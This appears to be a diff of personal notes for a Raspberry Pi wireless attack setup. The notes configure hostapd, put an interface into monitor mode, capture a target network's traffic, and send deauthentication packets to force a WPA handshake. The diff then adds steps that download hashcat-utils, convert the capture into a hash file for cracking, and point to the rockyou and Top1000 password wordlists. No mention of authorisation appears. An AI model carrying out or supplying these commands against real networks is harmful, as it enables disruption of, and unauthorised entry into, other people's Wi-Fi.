@@ -48,13 +48,7 @@ specify the location of the config file we just created
 to
 DAEMON_CONF="/etc/hostapd/hostapd.conf"
 
-apt install aircrack-ng p7zip git ocl-icd-libopencl1
-git clone https://github.com/hashcat/hashcat.git
-cd hashcat
-make
-make install
-
-
+apt install aircrack-ng p7zip
 
 airmon-ng start wlan1
 airmon-ng check kill
@@ -67,8 +61,16 @@ airodump-ng -c [channel# of target] --bssid [bssid] -w /home/pi/capture wlan1mon
 #new term, -0 is deauth packets, sending 2, a for AP
 aireplay-ng -0 2 -a [get BSSID] wlan1mon
 #second terminal has bssid for AP. check for wpa handshake
-#convert and then crack. hashcat
+#convert and then export for cracking
 
+wget https://github.com/hashcat/hashcat-utils/archive/master.zip
+unzip master.zip
+cd hashcat-utils-master/src
+make
+#create the hccap file for hashcat
+./cap2hccapx.bin /home/pi/capture/-01.cap /home/pi/capture/crackme.hccap
+
+#wordlists
 https://da.gd/rockyou
 https://da.gd/Top1000
 
